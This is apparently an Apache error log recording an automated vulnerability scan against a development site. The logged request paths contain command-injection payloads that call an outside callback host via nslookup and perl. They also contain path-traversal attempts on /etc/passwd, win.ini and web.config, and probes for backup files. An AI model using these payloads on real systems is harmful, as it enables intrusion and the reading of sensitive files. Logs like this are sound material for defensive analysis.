[Wed Jul 07 19:28:17.087007 2021] [php7:error] [pid 14780] [client 27.147.202.214:2505] script '/var/www/html/dev.wilkescw.com/admin/error9728617.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:28:17.141011 2021] [php7:error] [pid 14373] [client 27.147.202.214:3358] script '/var/www/html/dev.wilkescw.com/admin/|echo zrreoh$()\\ kazgdg\\nz^xyu||a #' |echo zrreoh$()\\ kazgdg\\nz^xyu||a #|" |echo zrreoh$()\\ kazgdg\\nz^xyu||a #.php' not found or unable to stat
[Wed Jul 07 19:28:17.176285 2021] [php7:error] [pid 14356] [client 27.147.202.214:3437] script '/var/www/html/dev.wilkescw.com/admin/".gethostbyname(lc("hitzl"."uiyjfnty4d0dd.bxss.me."))."A".chr(67).chr(hex("58")).chr(106).chr(78).chr(104).chr(66).".php' not found or unable to stat
[Wed Jul 07 19:28:17.470167 2021] [php7:error] [pid 14373] [client 27.147.202.214:3358] script '/var/www/html/dev.wilkescw.com/admin/(nslookup hitctxwdgldfode9f1.bxss.me||perl -e "gethostbyname('hitctxwdgldfode9f1.bxss.me')").php' not found or unable to stat
[Wed Jul 07 19:28:18.112527 2021] [core:error] [pid 14373] [client 27.147.202.214:3358] AH00126: Invalid URI in request GET /js//........................................................................../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:28:18.480274 2021] [core:error] [pid 14405] (36)File name too long: [client 27.147.202.214:10338] AH00036: access to /;(nslookup hitevhtkenkun41c8a.bxss.me||perl -e "gethostbyname('hitevhtkenkun41c8a.bxss.me')")|(nslookup hitevhtkenkun41c8a.bxss.me||perl -e "gethostbyname('hitevhtkenkun41c8a.bxss.me')")&(nslookup hitevhtkenkun41c8a.bxss.me||perl -e "gethostbyname('hitevhtkenkun41c8a.bxss.me')")/main.css failed (filesystem path '/var/www/html/dev.wilkescw.com/;(nslookup hitevhtkenkun41c8a.bxss.me||perl -e "gethostbyname('hitevhtkenkun41c8a.bxss.me')")|(nslookup hitevhtkenkun41c8a.bxss.me||perl -e "gethostbyname('hitevhtkenkun41c8a.bxss.me')")&(nslookup hitevhtkenkun41c8a.bxss.me||perl -e "gethostbyname('hitevhtkenkun41c8a.bxss.me')")')
[Wed Jul 07 19:28:18.720408 2021] [php7:error] [pid 14356] [client 27.147.202.214:3437] script '/var/www/html/dev.wilkescw.com/faculty.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:28:18.744453 2021] [php7:error] [pid 14799] [client 27.147.202.214:10359] script '/var/www/html/dev.wilkescw.com/admin/$(nslookup hiteqsnymqicj7b563.bxss.me||perl -e "gethostbyname('hiteqsnymqicj7b563.bxss.me')").php' not found or unable to stat
[Wed Jul 07 19:28:19.100267 2021] [core:error] [pid 14381] [client 27.147.202.214:10379] AH00126: Invalid URI in request GET /js//........................................................................../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:28:19.138403 2021] [core:error] [pid 14375] [client 27.147.202.214:4321] AH00126: Invalid URI in request GET /js//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:28:19.399843 2021] [php7:error] [pid 14356] [client 27.147.202.214:3437] script '/var/www/html/dev.wilkescw.com/admin/&(nslookup hitstcoccgtjx3e349.bxss.me||perl -e "gethostbyname('hitstcoccgtjx3e349.bxss.me')")&'\\"`0&(nslookup hitstcoccgtjx3e349.bxss.me||perl -e "gethostbyname('hitstcoccgtjx3e349.bxss.me')")&`'.php' not found or unable to stat
[Wed Jul 07 19:28:19.610407 2021] [php7:error] [pid 14807] [client 27.147.202.214:6185] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/admin/faculty.php?900443@
[Wed Jul 07 19:28:19.776083 2021] [php7:error] [pid 14332] [client 27.147.202.214:9998] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:28:20.031720 2021] [php7:error] [pid 14780] [client 27.147.202.214:2505] script '/var/www/html/dev.wilkescw.com/admin/|(nslookup hitcrcfdnftfr58df4.bxss.me||perl -e "gethostbyname('hitcrcfdnftfr58df4.bxss.me')").php' not found or unable to stat
[Wed Jul 07 19:28:20.656145 2021] [php7:error] [pid 14456] [client 27.147.202.214:6233] script '/var/www/html/dev.wilkescw.com/admin/`(nslookup hitgkrqftyyusb724b.bxss.me||perl -e "gethostbyname('hitgkrqftyyusb724b.bxss.me')")`.php' not found or unable to stat
[Wed Jul 07 19:28:20.959410 2021] [php7:error] [pid 14348] [client 27.147.202.214:10403] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/admin/faculty.php?id=953193@
[Wed Jul 07 19:28:21.443054 2021] [core:error] [pid 14149] [client 27.147.202.214:10456] AH00126: Invalid URI in request GET /js//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:28:21.845302 2021] [negotiation:error] [pid 14488] [client 27.147.202.214:4203] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/dev.wilkescw.com/admin/index (None could be negotiated).
[Wed Jul 07 19:28:21.887799 2021] [core:error] [pid 14356] (36)File name too long: [client 27.147.202.214:3437] AH00036: access to /admin/;(nslookup hitnfyvemvldada181.bxss.me||perl -e "gethostbyname('hitnfyvemvldada181.bxss.me')")|(nslookup hitnfyvemvldada181.bxss.me||perl -e "gethostbyname('hitnfyvemvldada181.bxss.me')")&(nslookup hitnfyvemvldada181.bxss.me||perl -e "gethostbyname('hitnfyvemvldada181.bxss.me')").php failed (filesystem path '/var/www/html/dev.wilkescw.com/admin/;(nslookup hitnfyvemvldada181.bxss.me||perl -e "gethostbyname('hitnfyvemvldada181.bxss.me')")|(nslookup hitnfyvemvldada181.bxss.me||perl -e "gethostbyname('hitnfyvemvldada181.bxss.me')")&(nslookup hitnfyvemvldada181.bxss.me||perl -e "gethostbyname('hitnfyvemvldada181.bxss.me')").php')
[Wed Jul 07 19:28:23.881864 2021] [php7:error] [pid 14147] [client 27.147.202.214:12383] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:28:24.043349 2021] [core:error] [pid 14383] (36)File name too long: [client 27.147.202.214:10391] AH00036: access to /;(nslookup hitrjcobmbsmfd31aa.bxss.me||perl -e "gethostbyname('hitrjcobmbsmfd31aa.bxss.me')")|(nslookup hitrjcobmbsmfd31aa.bxss.me||perl -e "gethostbyname('hitrjcobmbsmfd31aa.bxss.me')")&(nslookup hitrjcobmbsmfd31aa.bxss.me||perl -e "gethostbyname('hitrjcobmbsmfd31aa.bxss.me')")/faculty.php failed (filesystem path '/var/www/html/dev.wilkescw.com/;(nslookup hitrjcobmbsmfd31aa.bxss.me||perl -e "gethostbyname('hitrjcobmbsmfd31aa.bxss.me')")|(nslookup hitrjcobmbsmfd31aa.bxss.me||perl -e "gethostbyname('hitrjcobmbsmfd31aa.bxss.me')")&(nslookup hitrjcobmbsmfd31aa.bxss.me||perl -e "gethostbyname('hitrjcobmbsmfd31aa.bxss.me')")')
[Wed Jul 07 19:28:24.289599 2021] [core:error] [pid 14456] [client 27.147.202.214:6233] AH00126: Invalid URI in request GET /icons//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:28:24.365641 2021] [core:error] [pid 14405] (36)File name too long: [client 27.147.202.214:10338] AH00036: access to /;(nslookup hitphyepcpgboebe3d.bxss.me||perl -e "gethostbyname('hitphyepcpgboebe3d.bxss.me')")|(nslookup hitphyepcpgboebe3d.bxss.me||perl -e "gethostbyname('hitphyepcpgboebe3d.bxss.me')")&(nslookup hitphyepcpgboebe3d.bxss.me||perl -e "gethostbyname('hitphyepcpgboebe3d.bxss.me')")/classes.php failed (filesystem path '/var/www/html/dev.wilkescw.com/;(nslookup hitphyepcpgboebe3d.bxss.me||perl -e "gethostbyname('hitphyepcpgboebe3d.bxss.me')")|(nslookup hitphyepcpgboebe3d.bxss.me||perl -e "gethostbyname('hitphyepcpgboebe3d.bxss.me')")&(nslookup hitphyepcpgboebe3d.bxss.me||perl -e "gethostbyname('hitphyepcpgboebe3d.bxss.me')")')
[Wed Jul 07 19:28:24.616596 2021] [core:error] [pid 14359] [client 27.147.202.214:1142] AH00126: Invalid URI in request GET /icons//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:28:25.039500 2021] [php7:error] [pid 14467] [client 27.147.202.214:9996] script '/var/www/html/dev.wilkescw.com/forgot311ES.php' not found or unable to stat
[Wed Jul 07 19:28:25.470702 2021] [negotiation:error] [pid 14372] [client 27.147.202.214:11789] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/dev.wilkescw.com/forgot (None could be negotiated).
[Wed Jul 07 19:28:25.516327 2021] [core:error] [pid 14807] [client 27.147.202.214:6185] AH00126: Invalid URI in request GET /js//........................................................................../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:28:25.698114 2021] [php7:error] [pid 14467] [client 27.147.202.214:9996] script '/var/www/html/dev.wilkescw.com/4E3Feforgot.php' not found or unable to stat
[Wed Jul 07 19:28:25.841817 2021] [core:error] [pid 14356] [client 27.147.202.214:3437] AH00126: Invalid URI in request GET /js//........................................................................../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:28:25.915742 2021] [core:error] [pid 14813] [client 27.147.202.214:7098] AH00126: Invalid URI in request GET /icons//../../../../../../../../etc/passwd%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:28:27.174146 2021] [core:error] [pid 14333] [client 27.147.202.214:11781] AH00126: Invalid URI in request GET /icons//../../../../../../../../windows/win.ini%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:28:27.530845 2021] [php7:error] [pid 14456] [client 27.147.202.214:11874] script '/var/www/html/dev.wilkescw.com/js/extention/vx1eci72h08i.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:28:27.573906 2021] [core:error] [pid 14373] [client 27.147.202.214:11877] AH00126: Invalid URI in request GET /js//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:28:27.762649 2021] [core:error] [pid 14384] [client 27.147.202.214:10452] AH00126: Invalid URI in request GET /css//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:28:27.899072 2021] [core:error] [pid 14799] [client 27.147.202.214:10359] AH00126: Invalid URI in request GET /js//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:28:28.085228 2021] [php7:error] [pid 14856] [client 27.147.202.214:11872] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/admin/index.php?968884@
[Wed Jul 07 19:28:28.086205 2021] [core:error] [pid 14359] [client 27.147.202.214:11871] AH00126: Invalid URI in request GET /css//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:28:28.441539 2021] [php7:error] [pid 14147] [client 27.147.202.214:12383] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:28:29.276060 2021] [php7:error] [pid 14807] [client 27.147.202.214:11876] script '/var/www/html/dev.wilkescw.com/old_forgot.php' not found or unable to stat
[Wed Jul 07 19:28:29.597808 2021] [php7:error] [pid 14807] [client 27.147.202.214:11876] script '/var/www/html/dev.wilkescw.com/forgot_old.php' not found or unable to stat
[Wed Jul 07 19:28:29.728224 2021] [core:error] [pid 14381] (36)File name too long: [client 27.147.202.214:11778] AH00036: access to /;(nslookup hitazxmzspsso245ce.bxss.me||perl -e "gethostbyname('hitazxmzspsso245ce.bxss.me')")|(nslookup hitazxmzspsso245ce.bxss.me||perl -e "gethostbyname('hitazxmzspsso245ce.bxss.me')")&(nslookup hitazxmzspsso245ce.bxss.me||perl -e "gethostbyname('hitazxmzspsso245ce.bxss.me')")/index.php failed (filesystem path '/var/www/html/dev.wilkescw.com/;(nslookup hitazxmzspsso245ce.bxss.me||perl -e "gethostbyname('hitazxmzspsso245ce.bxss.me')")|(nslookup hitazxmzspsso245ce.bxss.me||perl -e "gethostbyname('hitazxmzspsso245ce.bxss.me')")&(nslookup hitazxmzspsso245ce.bxss.me||perl -e "gethostbyname('hitazxmzspsso245ce.bxss.me')")')
[Wed Jul 07 19:28:29.844182 2021] [core:error] [pid 14456] [client 27.147.202.214:11874] AH00126: Invalid URI in request GET /js//../../../../../../../../etc/passwd%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:28:29.929133 2021] [php7:error] [pid 14807] [client 27.147.202.214:11876] script '/var/www/html/dev.wilkescw.com/forgot_bak.php' not found or unable to stat
[Wed Jul 07 19:28:30.247039 2021] [php7:error] [pid 14856] [client 27.147.202.214:11872] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/admin/index.php?id=968007@
[Wed Jul 07 19:28:30.490313 2021] [core:error] [pid 14813] [client 27.147.202.214:1252] AH00126: Invalid URI in request GET /js//../../../../../../../../windows/win.ini%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:28:31.060159 2021] [core:error] [pid 14798] [client 27.147.202.214:11782] AH00126: Invalid URI in request GET /icons//../../../WEB-INF/web.xml? HTTP/1.1
[Wed Jul 07 19:28:32.344070 2021] [core:error] [pid 14411] [client 27.147.202.214:9717] AH00126: Invalid URI in request GET /icons//../../../WEB-INF/web.xml%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:28:32.782757 2021] [core:error] [pid 14381] [client 27.147.202.214:11778] AH00126: Invalid URI in request GET /css//........................................................................../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:28:33.015673 2021] [core:error] [pid 14453] [client 27.147.202.214:10570] AH00126: Invalid URI in request GET /js//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:28:33.196734 2021] [core:error] [pid 14808] [client 27.147.202.214:11780] AH00126: Invalid URI in request GET /css//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:28:33.749890 2021] [core:error] [pid 14786] [client 27.147.202.214:9799] AH00126: Invalid URI in request GET /css//........................................................................../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:28:34.057327 2021] [php7:error] [pid 14359] [client 27.147.202.214:9758] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:28:35.061730 2021] [core:error] [pid 14798] [client 27.147.202.214:9808] AH00126: Invalid URI in request GET /js//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:28:35.215956 2021] [core:error] [pid 14384] [client 27.147.202.214:9817] AH00126: Invalid URI in request GET /css//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:28:35.579710 2021] [core:error] [pid 14348] [client 27.147.202.214:11786] AH00126: Invalid URI in request GET /icons/../../Gemfile HTTP/1.1
[Wed Jul 07 19:28:35.592914 2021] [core:error] [pid 14493] [client 27.147.202.214:9984] AH00126: Invalid URI in request GET /js//../../../WEB-INF/web.xml? HTTP/1.1
[Wed Jul 07 19:28:36.396153 2021] [core:error] [pid 14339] [client 27.147.202.214:3353] AH00126: Invalid URI in request GET /js//../../../../../../../../etc/passwd%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:28:36.556078 2021] [core:error] [pid 14467] [client 27.147.202.214:7583] AH00126: Invalid URI in request GET /icons/../../web.config HTTP/1.1
[Wed Jul 07 19:28:37.736010 2021] [core:error] [pid 14809] [client 27.147.202.214:10238] AH00126: Invalid URI in request GET /js//../../../../../../../../windows/win.ini%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:28:38.237317 2021] [core:error] [pid 14880] [client 27.147.202.214:10246] AH00126: Invalid URI in request GET /icons/../../package.json HTTP/1.1
[Wed Jul 07 19:28:38.568526 2021] [core:error] [pid 14367] [client 27.147.202.214:10569] AH00126: Invalid URI in request GET /icons/../../package-lock.json HTTP/1.1
[Wed Jul 07 19:28:38.786217 2021] [core:error] [pid 14365] [client 27.147.202.214:7585] AH00126: Invalid URI in request GET /js//../../../WEB-INF/web.xml%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:28:39.968757 2021] [php7:error] [pid 14345] [client 27.147.202.214:11155] script '/var/www/html/dev.wilkescw.com/js/extention/apc.php' not found or unable to stat
[Wed Jul 07 19:28:40.282670 2021] [core:error] [pid 14369] [client 27.147.202.214:11141] AH00126: Invalid URI in request GET /css//........................................................................../../../../../../../../etc/passwd HTTP/1.1
